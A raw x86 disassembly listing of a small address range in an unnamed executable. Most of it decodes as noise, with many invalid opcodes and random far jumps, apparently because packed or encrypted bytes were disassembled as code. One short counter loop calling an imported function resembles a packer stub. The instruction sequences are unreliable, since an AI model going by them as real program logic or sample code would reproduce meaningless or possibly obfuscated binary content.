  415fb1:	fld    DWORD PTR [ecx]
  415fb3:	ret    0x1e26
  415fb6:	popa   
  415fb7:	jns    0x415f76
  415fb9:	and    eax,DWORD PTR [ecx+0x5e40a63a]
  415fbf:	push   ebp
  415fc0:	mov    DWORD PTR [esi-0x2de5b3fb],ecx
  415fc6:	in     eax,0x63
  415fc8:	dec    edx
  415fc9:	mov    DWORD PTR [ecx+0x488e8d0a],0x1fc97877
  415fd3:	retf   0xcb17
  415fd6:	daa    
  415fd7:	dec    ecx
  415fd8:	pop    ebx
  415fd9:	cdq    
  415fda:	xor    eax,0x2af069da
  415fdf:	(bad)  
  415fe0:	cmp    BYTE PTR [eax],al
  415fe2:	(bad)  
  415fe3:	mov    ah,0x31
  415fe5:	mov    al,0xd6
  415fe7:	and    ch,dh
  415fe9:	push   cs
  415fea:	imul   esi,DWORD PTR [edx-0x49a977cc],0x440ac028
  415ff4:	lods   eax,DWORD PTR ds:[esi]
  415ff5:	out    0x26,eax
  415ff7:	sar    DWORD PTR [eax+0x56],cl
  415ffa:	iret   
  415ffb:	jmp    0x404:0x38a3fe89
  416002:	sub    DWORD PTR [edx-0x4a],ecx
  416005:	dec    eax
  416006:	mov    ds:0xc4960790,eax
  41600b:	inc    edi
  41600c:	jne    0x415fd4
  41600e:	pushf  
  41600f:	adc    al,0x3c
  416011:	cmp    bh,cl
  416013:	cmp    ch,dh
  416015:	cmc    
  416016:	fcom   QWORD PTR [edi]
  416018:	inc    esp
  416019:	mov    eax,0x5dd3d7d1
  41601e:	sbb    cl,dh
  416020:	outs   dx,DWORD PTR ds:[esi]
  416021:	push   ss
  416022:	lahf   
  416023:	into   
  416024:	sub    dh,BYTE PTR [eax]
  416026:	dec    ebx
  416027:	mov    ebx,0xcf5df025
  41602c:	inc    ebp
  41602d:	repz lock aad 0xc3
  416031:	enter  0x5bd3,0xca
  416035:	mul    BYTE PTR [ebp+ebp*4-0x76]
  416039:	jbe    0x416093
  41603b:	repz push esp
  41603d:	cli    
  41603e:	pop    esp
  41603f:	ds cdq 
  416041:	clc    
  416042:	or     al,0xe8
  416044:	sub    cl,BYTE PTR [esp+edx*2]
  416047:	enter  0x2638,0xa3
  41604b:	push   eax
  41604c:	pop    ds
  41604d:	nop
  41604e:	gs loopne 0x41607a
  416051:	jnp    0x4160d0
  416053:	mov    ah,0x5e
  416055:	jnp    0x41607f
  416057:	pusha  
  416058:	in     eax,dx
  416059:	push   ebx
  41605a:	push   eax
  41605b:	and    BYTE PTR [esi],0x1b
  41605e:	push   edx
  41605f:	sub    BYTE PTR ds:0x3978e1fc,bh
  416065:	imul   ecx,esp,0x60f15c5c
  41606b:	data16 jp 0x41602f
  41606e:	sbb    ebp,ecx
  416070:	cmp    al,0x49
  416072:	aam    0xda
  416074:	adc    BYTE PTR [edi+0x5314ea2b],0xf2
  41607b:	lods   eax,DWORD PTR ds:[esi]
  41607c:	pusha  
  41607d:	sub    eax,0xffffffff
  416080:	imul   ebp,DWORD PTR [esi+0x608a37f8],0x2984e5b8
  41608a:	push   eax
  41608b:	imul   edi,DWORD PTR [ebp+0x55],0x13
  41608f:	jge    0x416090
  416091:	fldcw  WORD PTR [eax+0x464e7263]
  416097:	int    0x48
  416099:	enter  0x4fab,0x4c
  41609d:	sbb    al,0xda
  41609f:	lea    edx,[ebx+0x72]
  4160a2:	call   0xbc58:0xdba904a4
  4160a9:	push   ds
  4160aa:	fist   WORD PTR [ebx]
  4160ac:	add    DWORD PTR [ebp-0x3c5f4b6f],eax
  4160b2:	sub    BYTE PTR gs:[ebx+ecx*8-0x66e1c7f8],cl
  4160ba:	mov    al,BYTE PTR [edx+0x44297f2a]
  4160c0:	mov    dl,0x35
  4160c2:	sub    DWORD PTR [ebx-0x5],0xfffffffc
  4160c6:	in     al,dx
  4160c7:	pusha  
  4160c8:	jge    0x41613e
  4160ca:	(bad)  
  4160cb:	push   ebp
  4160cc:	fisttp QWORD PTR [ecx+0x0]
  4160cf:	mov    esi,0x759d94ca
  4160d4:	daa    
  4160d5:	cmp    DWORD PTR [ecx-0x7d23ba9b],0x1147827d
  4160df:	outs   dx,BYTE PTR ds:[esi]
  4160e0:	mov    WORD PTR [ebp-0x5b1f1330],?
  4160e6:	imul   edx,DWORD PTR [ecx+ebp*4-0x5d],0xffffffd3
  4160eb:	gs je  0x416157
  4160ee:	or     BYTE PTR [esi-0x6f953971],dl
  4160f4:	retf   
  4160f5:	push   eax
  4160f6:	sbb    BYTE PTR [ebx+0x53],ah
  4160f9:	add    DWORD PTR [ebp+ebx*8+0x31],eax
  4160fd:	cmc    
  4160fe:	les    ebp,FWORD PTR [ebx-0x67b56a94]
  416104:	add    cl,ah
  416106:	pusha  
  416107:	cld    
  416108:	test   DWORD PTR [ebp+0x4f],ebx
  41610b:	shr    BYTE PTR [edi],1
  41610d:	or     DWORD PTR [eax+0x7a],ebp
  416110:	lock xor al,0x53
  416113:	sub    al,0xb7
  416115:	test   DWORD PTR [edx+0x593354d3],edx
  41611b:	test   BYTE PTR [esi+ebp*1+0x61],dl
  41611f:	adc    DWORD PTR [ecx],ecx
  416121:	(bad)  
  416122:	cmc    
  416123:	jnp    0x4160af
  416125:	and    DWORD PTR [edx],edi
  416127:	fild   QWORD PTR [ecx-0x71]
  41612a:	cdq    
  41612b:	mov    al,0xd2
  41612d:	adc    DWORD PTR [esi-0x6a0aee62],ebp
  416133:	xchg   bx,ax
  416135:	jb     0x41618b
  416137:	je     0x4160d8
  416139:	cmp    ah,BYTE PTR [ecx+0x929a827]
  41613f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416140:	sar    al,0x1a
  416143:	lahf   
  416144:	(bad)  
  416145:	mov    BYTE PTR [esi],bh
  416147:	(bad)  ss:[edx]
  41614a:	and    eax,0xbb1280c0
  41614f:	inc    edx
  416150:	push   esi
  416151:	push   0x99bb1864
  416156:	xor    edi,eax
  416158:	and    al,bh
  41615a:	js     0x4161d4
  41615c:	loopne 0x4160e1
  41615e:	mov    eax,ds:0xf45e64f2
  416163:	das    
  416164:	mov    esp,0x4158b6ae
  416169:	sub    bl,BYTE PTR [ebx]
  41616b:	inc    ebx
  41616c:	std    
  41616d:	fwait
  41616e:	mov    DWORD PTR [edi],esi
  416170:	fwait
  416171:	push   ebx
  416172:	hlt    
  416173:	adc    DWORD PTR [ebx],0x27
  416176:	les    ecx,FWORD PTR [eax+0x71]
  416179:	daa    
  41617a:	fsubr  QWORD PTR [ebx]
  41617c:	dec    BYTE PTR [edi]
  41617e:	mov    bh,0xb8
  416180:	mov    ebx,0xdb369d7d
  416185:	in     eax,dx
  416186:	adc    al,BYTE PTR [edi]
  416188:	cwde   
  416189:	xchg   ebp,eax
  41618a:	out    dx,al
  41618b:	dec    edx
  41618c:	pop    edi
  41618d:	arpl   WORD PTR [esi+0x56cd1226],bx
  416193:	(bad)  
  416195:	sbb    al,0x23
  416197:	aam    0xa4
  416199:	or     al,0xb8
  41619b:	cdq    
  41619c:	cmp    al,0xe5
  41619e:	test   BYTE PTR [eax+0x49],dl
  4161a1:	jg     0x41619b
  4161a3:	jl     0x41617f
  4161a5:	test   DWORD PTR [ebp-0x4f],esp
  4161a8:	fadd   QWORD PTR [ecx]
  4161aa:	mov    bh,0x9a
  4161ac:	js     0x41617e
  4161ae:	mov    ch,0xe7
  4161b0:	jns    0x41614c
  4161b2:	loop   0x4161c6
  4161b4:	not    DWORD PTR [ecx+0x7856bccf]
  4161ba:	push   cs
  4161bb:	dec    ebx
  4161bc:	ins    BYTE PTR es:[edi],dx
  4161bd:	js     0x416185
  4161bf:	mov    esp,0xb5e5a70d
  4161c4:	sbb    ch,BYTE PTR [edx+0x2fb0aa9e]
  4161ca:	jecxz  0x4161b7
  4161cc:	mov    WORD PTR [edi-0x5d42f7eb],gs
  4161d2:	loope  0x41623c
  4161d4:	inc    ecx
  4161d5:	mov    ebp,0x48937e50
  4161da:	in     al,dx
  4161db:	inc    eax
  4161dc:	xchg   BYTE PTR [ebp+0x56],ah
  4161df:	mov    ebx,0xf09f1f2d
  4161e4:	les    ebx,FWORD PTR [ebx+0x3b8c8c59]
  4161ea:	ins    DWORD PTR es:[edi],dx
  4161eb:	and    BYTE PTR [ecx],cl
  4161ed:	mov    ebx,0x8b0ca40d
  4161f2:	inc    ebp
  4161f3:	cld    
  4161f4:	mov    DWORD PTR ds:0x42a8ad,0x1c
  4161fe:	cmp    DWORD PTR ds:0x42a8ad,0x0
  416205:	je     0x41625b
  41620b:	cmp    DWORD PTR ds:0x42a8ad,0xe
  416212:	jne    0x41622f
  416218:	push   0x7e45
  41621d:	push   DWORD PTR [ebp-0x1c]
  416220:	push   DWORD PTR [ebp-0xc]
  416223:	push   DWORD PTR [ebp-0x20]
  416226:	push   DWORD PTR [ebp-0x14]
  416229:	call   DWORD PTR ds:0x41d1f4
  41622f:	cmp    DWORD PTR ds:0x42a8ad,0xf
  416236:	jne    0x416249
  41623c:	mov    edx,DWORD PTR ds:0x42a8ad
  416242:	dec    edx
  416243:	mov    DWORD PTR ds:0x42a8ad,edx
  416249:	mov    edx,DWORD PTR ds:0x42a8ad
  41624f:	dec    edx
  416250:	mov    DWORD PTR ds:0x42a8ad,edx
  416256:	jmp    0x4161fe
  41625b:	xor    eax,edi
  41625d:	add    eax,esi
  41625f:	add    DWORD PTR ds:0x42a789,edi
  416265:	push   eax
  416266:	push   DWORD PTR [ebp-0x8]
  416269:	push   DWORD PTR [ebp-0x4]
  41626c:	mov    edx,DWORD PTR ds:0x41eae6
  416272:	add    DWORD PTR ds:0x42a861,0x2531
  41627c:	jmp    0x416534
  416281:	ret    0x3fc0
  416284:	leave  
  416285:	leave  
  416286:	leave  
  416287:	retf   0x22c7
  41628a:	add    esp,DWORD PTR [ebx-0x168b6f46]
  416290:	cwde   
  416291:	mov    esp,0x95787f18
  416296:	jle    0x416310
  416298:	js     0x416274
  41629a:	push   ebx
  41629b:	inc    ebx
  41629c:	mov    edx,0x8f154bdb
  4162a1:	out    0xf4,al
  4162a3:	jp     0x4162a6
  4162a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162a6:	ret    
  4162a7:	push   esp
  4162a8:	lds    esp,FWORD PTR [edx]
  4162aa:	rcl    BYTE PTR [ecx+0x5b0f6983],0xf0
  4162b1:	pop    ss
  4162b2:	and    al,al
  4162b4:	js     0x41624e
  4162b6:	(bad)  
  4162b7:	hlt    
  4162b8:	mov    ebx,0x8cd00df7
  4162bd:	adc    DWORD PTR [esi],ecx
  4162bf:	xor    eax,0xc8d910f4
  4162c4:	out    0x68,eax
  4162c6:	or     DWORD PTR [ebx-0x523135e2],eax
  4162cc:	mov    ebp,0xfb0ba569
  4162d1:	adc    ch,BYTE PTR [eax+0x36d3a20e]
  4162d7:	aaa    
  4162d8:	jg     0x4162c8
  4162da:	mov    eax,0xe817e59d
  4162df:	div    DWORD PTR [ebx]
  4162e1:	sub    al,0xab
  4162e3:	mov    ds:0xf6de0123,eax
  4162e8:	int    0xe8
  4162ea:	mov    cl,0xf2
  4162ec:	ins    DWORD PTR es:[edi],dx
  4162ed:	aad    0xbf
  4162ef:	xchg   esp,eax
  4162f0:	int    0xc6
  4162f2:	inc    esi
  4162f3:	adc    eax,0x30e817eb
  4162f8:	push   esp
  4162f9:	pushf  
  4162fa:	pop    ecx
  4162fb:	adc    ch,bl
  4162fd:	(bad)  
  4162fe:	lahf   
  4162ff:	out    dx,eax
  416300:	ret    0xc723
  416303:	callw  0x7a20
  416307:	int    0x17
  416309:	shl    BYTE PTR [ebx+edx*2+0x16b6c8bb],1
  416310:	test   al,0xe7
  416312:	inc    esp
  416313:	and    eax,0x6d034455
  416318:	lods   eax,DWORD PTR ds:[esi]
  416319:	loopne 0x41630a
  41631b:	stos   BYTE PTR es:[edi],al
  41631c:	fwait
  41631d:	jno    0x4162cd
  41631f:	icebp  
  416320:	pop    ebx
  416321:	xchg   edx,eax
  416322:	mov    eax,0x862d5414
  416327:	and    eax,0x8f224c78
  41632c:	sbb    bl,cl
  41632e:	lahf   
  41632f:	das    
  416330:	pop    edx
  416331:	push   0xffffffb3
  416333:	enter  0x5143,0xf3
  416337:	loopne 0x4162ca
  416339:	jns    0x4162e6
  41633b:	cld    
  41633c:	and    dl,cl
  41633e:	dec    ecx
  41633f:	shr    DWORD PTR ds:0x2f5cb127,0x85
  416346:	or     eax,0xd0a29ffc
  41634b:	pusha  
  41634c:	repnz mov esi,0x9f896287
  416352:	or     al,0xfe
  416354:	jg     0x4162da
  416356:	push   cs
  416357:	(bad)  
  416358:	jp     0x4162e4
  41635a:	push   esi
  41635b:	jg     0x4163a1
  41635d:	jge    0x4163d0
  41635f:	cwde   
  416360:	pop    ebx
  416361:	sahf   
  416362:	out    0xf0,eax
  416364:	push   0xc87e6b71
  416369:	dec    esi
  41636a:	add    al,0x58
  41636c:	mov    ah,0x45
  41636e:	and    ebp,0x7f4fa154
  416374:	dec    edi
  416375:	pop    eax
  416376:	test   BYTE PTR [esi],ah
  416378:	mov    dh,0xcd
  41637a:	pop    edx
  41637b:	fsub   QWORD PTR [ebx-0x452691f7]
  416381:	sbb    ch,bl
  416383:	xchg   ebp,eax
  416384:	(bad)  
  416386:	xchg   BYTE PTR [edi-0x12fa9a57],al
  41638c:	stc    
  41638d:	push   cs
  41638e:	sbb    eax,0xffffff88
  416391:	fneni(8087 only) 
  416393:	(bad)  
  416394:	scas   al,BYTE PTR es:[edi]
  416395:	cmp    DWORD PTR [esi-0x45beddb7],ecx
  41639b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41639c:	neg    bh
  41639e:	out    dx,al
  41639f:	mov    ah,0x87
  4163a1:	(bad)  
  4163a2:	xlat   BYTE PTR ds:[ebx]
  4163a3:	push   ds
  4163a4:	lea    eax,[eax]
  4163a6:	xor    edi,edi
  4163a8:	sub    dh,dh
  4163aa:	daa    
  4163ab:	hlt    
  4163ac:	loopne 0x4163f4
  4163ae:	add    al,0x11
  4163b0:	add    ah,dh
  4163b2:	and    dh,bl
  4163b4:	(bad)  
  4163b5:	sbb    al,0xc9
  4163b7:	shl    DWORD PTR [ebx],1
  4163b9:	and    DWORD PTR [ebx+0x3d],eax
  4163bc:	lods   eax,DWORD PTR ds:[esi]
  4163bd:	mov    es,WORD PTR [ecx]
  4163bf:	icebp  
  4163c0:	mov    al,ds:0xc0e44e09
  4163c5:	or     BYTE PTR [esi],cl
  4163c7:	not    DWORD PTR [edi+eax*2+0x14]
  4163cb:	adc    al,0xe4
  4163cd:	xor    eax,0x21646022
  4163d2:	jecxz  0x41644b
  4163d4:	enter  0xfc62,0xa0
  4163d8:	test   al,0x4b
  4163da:	sub    ch,ch
  4163dc:	mov    eax,DWORD PTR [esi]
  4163de:	dec    eax
  4163df:	xchg   edi,eax
  4163e0:	dec    esi
  4163e1:	std    
  4163e2:	mov    bl,0xfe
  4163e4:	sti    
  4163e5:	mov    dl,0xba
  4163e7:	ins    DWORD PTR es:[edi],dx
  4163e8:	mov    al,0x25
  4163ea:	hlt    
  4163eb:	into   
  4163ec:	pop    ebx
  4163ed:	add    BYTE PTR [esi-0x7d],ah
  4163f0:	in     al,0x2f
  4163f2:	ja     0x416429
  4163f4:	dec    edx
  4163f5:	dec    ecx
  4163f6:	clc    
  4163f7:	(bad)  
  4163f8:	imul   ebx,DWORD PTR [edx],0x9c1d6a2a
  4163fe:	or     cl,dl
  416400:	loopne 0x416425
  416402:	add    al,0xda
  416404:	lock enter 0x17a3,0xf2
  416409:	js     0x416453
  41640b:	(bad)  
  41640c:	jns    0x416459
  41640e:	jg     0x416482
  416410:	jge    0x41644b
  416412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416413:	pop    edi
  416414:	sbb    BYTE PTR [ebx],bl
  416416:	je     0x41645b
  416418:	arpl   WORD PTR [ebx+edx*2-0xbd6d89b],si
  41641f:	xor    al,0x9e
  416421:	ds jnp 0x41648c
  416424:	hlt    
  416425:	rol    BYTE PTR [edx-0x2d299cba],cl
  41642b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41642c:	mov    dl,0xf7
  41642e:	push   0x35803532
  416433:	xor    al,0xec
  416435:	loope  0x416407
  416437:	dec    ecx
  416438:	and    ebp,DWORD PTR [edi]
  41643a:	test   DWORD PTR [eax+0x60824761],esi
  416440:	in     al,0x4
  416442:	sbb    DWORD PTR [edi+eax*2-0x458e3062],eax
  416449:	sahf   
  41644a:	outs   dx,BYTE PTR ds:[esi]
  41644b:	mov    bl,0x48
  41644d:	ret    0xc8a6
  416450:	(bad)  [eax]
  416452:	push   ss
  416453:	dec    esp
  416454:	test   BYTE PTR [esi-0x15809aa6],dl
  41645a:	inc    ebp
  41645b:	jno    0x41647d
  41645d:	int3   
  41645e:	test   DWORD PTR [esi],ecx
  416460:	gs cmc 
  416462:	cli    
  416463:	dec    ebx
  416464:	pop    edx
  416465:	cmp    BYTE PTR [edx],bl
  416467:	ja     0x416405
  416469:	and    BYTE PTR cs:[ecx],bh
  41646c:	sbb    al,0x42
  41646e:	aam    0x69
  416470:	cli    
  416471:	jl     0x41647d
  416473:	ror    BYTE PTR [edx],1
  416475:	push   ebx
  416476:	mov    edi,0x1d0aecbc
  41647b:	push   ds
  41647c:	sbb    bl,ch
  41647e:	hlt    
  41647f:	xor    ebx,DWORD PTR [esi-0x72]
  416482:	popf   
  416483:	jle    0x41642a
  416485:	test   dh,bl
  416487:	stos   BYTE PTR es:[edi],al
  416488:	out    0x8d,al
  41648a:	rcl    BYTE PTR [edi],1
  41648c:	fsub   DWORD PTR [ebx]
  41648e:	pop    ebx
  41648f:	(bad)  
  416490:	cld    
  416491:	pusha  
  416492:	aad    0x38
  416494:	xchg   DWORD PTR [edi+0x48],ecx
  416497:	mov    eax,ds:0x92323fda
  41649c:	xor    eax,DWORD PTR [eax-0x156139fa]
  4164a2:	mov    edi,0x293e8717
  4164a7:	mov    edi,0x43a0a48a
  4164ac:	std    
  4164ad:	(bad)  
  4164af:	pop    ebx
  4164b0:	inc    esp
  4164b1:	push   esp
  4164b2:	xor    al,0xbd
  4164b4:	mov    edi,0x4caa7aa1
  4164b9:	lock mov esi,0x477578b2
  4164bf:	pop    ebx
  4164c0:	retf   
  4164c1:	retf   0xe815
  4164c4:	mov    ebp,0x5ac3346d
  4164c9:	out    dx,al
  4164ca:	push   es
  4164cb:	mov    di,0xeda3
  4164cf:	xchg   DWORD PTR [eax+0x2152cb68],eax
  4164d5:	jle    0x4164c5
  4164d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164d8:	out    0x7a,eax
  4164da:	push   0x10243461
  4164df:	scas   al,BYTE PTR es:[edi]
  4164e0:	mov    eax,0xf6ccefd9
  4164e5:	scas   eax,DWORD PTR es:[edi]
  4164e6:	or     BYTE PTR [eax-0x43a7c17],ah
  4164ec:	sub    al,0x5d
  4164ee:	cmp    DWORD PTR [ecx],edi
  4164f0:	cmovo  eax,DWORD PTR [esp+ecx*1]
  4164f4:	mov    cl,0x95
  4164f6:	or     dl,bh
  4164f8:	adc    BYTE PTR [ebp-0x4],dl
  4164fb:	inc    ebp
  4164fc:	mov    ah,0x6e
  4164fe:	cmp    BYTE PTR [ebx+ebx*4+0x5a5d4a31],al
  416505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416506:	lods   al,BYTE PTR ds:[esi]
  416507:	out    dx,al
  416508:	push   edi
  416509:	out    dx,al
  41650a:	jne    0x416493
  41650c:	imul   edx,edi,0x69
  41650f:	or     BYTE PTR [eax],ch
  416511:	ret    0xe4f
  416514:	mov    cl,0xc4
  416516:	dec    ebx
  416517:	and    BYTE PTR [ecx-0x298c42b2],ah
  41651d:	sbb    bl,BYTE PTR [ecx-0x137f3c84]
  416523:	fsubr  QWORD PTR [edx+0x5104a425]
  416529:	jbe    0x416503
  41652b:	test   eax,0x814c05a8
  416530:	adc    DWORD PTR [eax+0x32e87fa4],ecx
  416536:	sbb    BYTE PTR [eax],al
  416538:	add    BYTE PTR [ebx+0x41eae60d],cl
  41653e:	add    BYTE PTR [ebx+0x1cc89],cl
  416544:	add    cl,ch
  416546:	mov    bl,0x2
  416548:	add    BYTE PTR [eax],al
  41654a:	ret    
  41654b:	int3   
  41654c:	(bad)  
  41654d:	int3   
  41654e:	aad    0xda
  416550:	leave  
  416551:	rol    DWORD PTR [ebp+0x1be37c66],cl
  416557:	mov    esi,0x1dd92b32
  41655c:	jg     0x4165d6
  41655e:	xchg   ebp,eax
  41655f:	jle    0x4165d9
  416561:	js     0x4165cd
  416563:	sbb    eax,0x2f2cfaad
  416568:	out    0x34,eax
  41656a:	adc    al,0x44
  41656c:	inc    ebx
  41656d:	fdivrp st(5),st
  41656f:	in     al,0x5b
  416571:	cdq    
  416572:	xchg   esi,eax
  416573:	arpl   WORD PTR [edi-0x6692696f],bx
  416579:	out    0x32,al
  41657b:	jge    0x4165c8
  41657d:	inc    eax
  41657e:	and    DWORD PTR [esp+ebx*2-0x323be1b6],0xa9a8f8db
  416589:	xchg   BYTE PTR [eax+0x19988407],ah
  41658f:	or     BYTE PTR [edx+0x28],0x59
  416593:	arpl   sp,cx
  416595:	scas   al,BYTE PTR es:[edi]
  416596:	das    
  416597:	test   eax,0x1df5826c
  41659c:	pop    ds
  41659d:	xor    DWORD PTR ds:0x34b3e619,esi
  4165a3:	push   edi
  4165a4:	jmp    0x8dcc:0xed7631a1
  4165ab:	dec    esp
  4165ac:	jb     0x4165f4
  4165ae:	ja     0x416603
  4165b0:	and    bl,BYTE PTR [edx-0x14]
  4165b3:	or     edi,eax
  4165b5:	pop    ds
  4165b6:	pop    esi
  4165b7:	cmp    al,0xda
  4165b9:	repz pop ecx
  4165bb:	bound  eax,QWORD PTR [eax-0xd9e0c6b]
  4165c1:	sbb    ebp,DWORD PTR [eax-0x32]
  4165c4:	out    dx,eax
  4165c5:	ins    DWORD PTR es:[edi],dx
  4165c6:	push   ebp
  4165c7:	test   al,0x30
  4165c9:	clc    
  4165ca:	jl     0x41663a
  4165cc:	mov    bl,0x9f
  4165ce:	loop   0x4165eb
  4165d0:	cs pop esi
  4165d2:	in     al,0x4a
  4165d4:	xlat   BYTE PTR ds:[ebx]
  4165d5:	inc    eax
  4165d6:	xchg   edx,eax
  4165d7:	test   ah,ah
  4165d9:	stc    
  4165da:	ins    DWORD PTR es:[edi],dx
  4165db:	push   0x3a
  4165dd:	jmp    0x7be:0xfbdeec0
  4165e4:	fidiv  WORD PTR [esi]
  4165e6:	(bad)  
  4165e8:	or     BYTE PTR [esp+eiz*4-0x5fe5f2e8],al
  4165ef:	shr    BYTE PTR [esi+ebx*1-0x50],1
  4165f3:	shl    DWORD PTR [edx+0x2efafe31],1
  4165f9:	addr16 (bad) 
  4165fc:	cdq    
  4165fd:	pop    ebp
  4165fe:	out    dx,al
  4165ff:	inc    esp
  416600:	xchg   DWORD PTR [ecx],eax
  416602:	inc    edx
  416603:	outs   dx,BYTE PTR ds:[esi]
  416604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416605:	dec    edx
  416606:	ret    
  416607:	jle    0x41665b
  416609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41660a:	mov    WORD PTR [edx],ss
  41660c:	js     0x41664d
  41660e:	out    dx,eax
  41660f:	push   ebx
  416610:	pop    es
  416611:	and    DWORD PTR [edi+ecx*4-0xc],esp
  416615:	mov    al,BYTE PTR [ebx-0x14]
  416618:	loop   0x4165c4
  41661a:	lea    esi,[ecx+0x51e8291d]
  416620:	mov    eax,ds:0x4688feb0
  416625:	mov    cl,0x9
  416627:	ror    bl,cl
  416629:	or     BYTE PTR [ebp+0x26667db9],bh
  41662f:	add    al,0xd2
  416631:	pop    ss
  416632:	xor    ebp,ebx
  416634:	push   ss
  416635:	jl     0x4165bb
  416637:	mov    ecx,0xb8a58003
  41663c:	gs jb  0x4165fe
  41663f:	add    DWORD PTR [esi+eax*8],edx
  416642:	push   ebx
  416643:	repz adc esp,DWORD PTR [ecx-0x44]
  416647:	push   esi
  416648:	js     0x416637
  41664a:	loop   0x41669c
  41664c:	pusha  
  41664d:	inc    ebp
  41664e:	pop    esp
  41664f:	jmp    0xd62e:0x969a2f9d
  416656:	inc    esi
  416657:	popf   
  416658:	das    
  416659:	sub    ebx,ecx
  41665b:	add    BYTE PTR [eax+0x2],0x2b
  41665f:	stos   DWORD PTR es:[edi],eax
  416660:	clc    
  416661:	and    al,0x4d
  416663:	sti    
  416664:	(bad)  
  416665:	enter  0x48d5,0xbb
  416669:	scas   eax,DWORD PTR es:[edi]
  41666a:	xor    eax,0x90c692c0
  41666f:	out    0xe2,eax
  416671:	lock push es
  416673:	fdiv   QWORD PTR [edx]
  416675:	pop    ds
  416676:	xor    BYTE PTR [eax],ah
  416678:	into   
  416679:	(bad)  
  41667a:	xchg   edx,eax
  41667b:	inc    ebx
  41667c:	mov    al,0xb1
  41667e:	stos   DWORD PTR es:[edi],eax
  41667f:	ret    
  416680:	pop    ss
  416681:	or     al,0x3f
  416683:	outs   dx,BYTE PTR ds:[esi]
  416684:	(bad)  
  416685:	outs   dx,DWORD PTR ds:[esi]
  416686:	(bad)  
  416687:	sub    eax,DWORD PTR [esi]
  416689:	lahf   
  41668a:	push   esp
  41668b:	xchg   esi,eax
  41668c:	retf   0xe1b1
  41668f:	aad    0x5b
  416691:	pushf  
  416692:	(bad)  [edx-0xaf740fc]
  416698:	aaa    
  416699:	mov    bh,0xf6
  41669b:	push   eax
  41669c:	cmp    al,0x30
  41669e:	in     eax,0x6b
  4166a0:	ins    BYTE PTR es:[edi],dx
  4166a1:	push   esp
  4166a2:	jb     0x4166fa
  4166a4:	fcmovnu st,st(6)
  4166a6:	dec    esp
  4166a7:	fucomp st(3)
  4166a9:	ds dec eax
  4166ab:	out    0x73,eax
  4166ad:	sbb    eax,0xc6c58ed1
  4166b2:	push   edi
  4166b3:	fiadd  DWORD PTR [ebx-0x782cbcc4]
  4166b9:	and    dl,BYTE PTR [edx+eiz*1+0x76]
  4166bd:	pop    ebp
  4166be:	push   ds
  4166bf:	loopne 0x416652
  4166c1:	push   0x360cb257
  4166c6:	iret   
  4166c7:	out    0xf0,eax
  4166c9:	call   0x1ae0ca99
  4166ce:	dec    ebx
  4166cf:	jbe    0x4166dc
  4166d1:	gs iret 
  4166d3:	sub    BYTE PTR [esi],ah
  4166d5:	fwait
  4166d6:	sbb    edi,edi
  4166d8:	out    0x5b,eax
  4166da:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166dc:	xlat   BYTE PTR ds:[ebx]
  4166dd:	lods   al,BYTE PTR ds:[esi]
  4166de:	scas   eax,DWORD PTR es:[edi]
  4166df:	or     al,0x71
  4166e1:	cmp    al,BYTE PTR [esi+0x25]
  4166e4:	add    DWORD PTR [esi],edi
  4166e6:	jbe    0x41666c
  4166e8:	mov    ch,0x85
  4166ea:	mov    ds:0xd7c10804,al
  4166ef:	or     al,0xb2
  4166f1:	dec    edi
  4166f2:	jae    0x416684
  4166f4:	push   edx
  4166f5:	sbb    al,0x2a
  4166f7:	inc    esi
  4166f8:	inc    ecx
  4166f9:	cld    
  4166fa:	xor    edx,edx
  4166fc:	mov    ss,WORD PTR [edi]
  4166fe:	call   0xcd9:0xfa9b2f56
  416705:	repnz outs dx,BYTE PTR ds:[esi]
  416707:	push   0xffffffd0
  416709:	out    dx,al
  41670a:	pop    edi
  41670b:	or     edi,DWORD PTR [edx]
  41670d:	push   edi
  41670e:	dec    ebp
  41670f:	mov    al,ds:0x446275d5
  416714:	nop
  416715:	pop    esp
  416716:	mov    cl,BYTE PTR [ebx-0x3f]
  416719:	sub    eax,0x5486c819
  41671e:	imul   edx,DWORD PTR [ecx+0x7295faa3],0x2b1346a3
  416728:	dec    ebp
  416729:	inc    edi
  41672a:	jecxz  0x41672d
  41672c:	mov    edi,0x99464836
  416731:	imul   edi,DWORD PTR [edx],0xc5f92ca6
  416737:	sbb    DWORD PTR [eax-0x36],esi
  41673a:	add    DWORD PTR [ecx],ebx
  41673c:	loop   0x41672f
  41673e:	pop    ebp
  41673f:	jg     0x41679b
  416741:	xchg   DWORD PTR [edi-0x3d9eb6c],ebx
  416747:	loop   0x416700
  416749:	cmp    cl,BYTE PTR [edi+0x2068d306]
  41674f:	push   ebx
  416750:	inc    ebx
  416751:	repnz hlt 
  416753:	ja     0x416732
  416755:	call   0xd9a:0x3f779557
  41675c:	mov    ah,al
  41675e:	je     0x4167a9
  416760:	xchg   ebp,eax
  416761:	mov    dh,0x89
  416763:	pop    esp
  416764:	pop    esp
  416765:	imul   edi,DWORD PTR [edx+0x7b],0xfe675b84
  41676c:	pop    esp
  41676d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41676e:	cdq    
  41676f:	fcmovu st,st(2)
  416771:	gs xchg edx,eax
  416773:	sbb    al,bh
  416775:	push   eax
  416776:	and    BYTE PTR es:[esi+0x72],al
  41677a:	dec    esp
  41677b:	inc    edi
  41677c:	ss jae 0x416785
  41677f:	les    edi,FWORD PTR [edi+0x23535f01]
  416785:	dec    ebp
  416786:	cs stos DWORD PTR es:[edi],eax
  416788:	(bad)  
  416789:	dec    esp
  41678a:	scas   eax,DWORD PTR es:[edi]
  41678b:	jbe    0x4167da
  41678d:	lods   al,BYTE PTR ds:[esi]
  41678e:	ffreep st(3)
  416790:	pushf  
  416791:	add    edx,eax
  416793:	fiadd  DWORD PTR [ecx+0x34]
  416796:	test   eax,0xec662626
  41679b:	pop    edx
  41679c:	sbb    BYTE PTR [esi+0x50dc1c6f],bl
  4167a2:	xchg   esi,eax
  4167a3:	jg     0x4167bd
  4167a5:	(bad)  
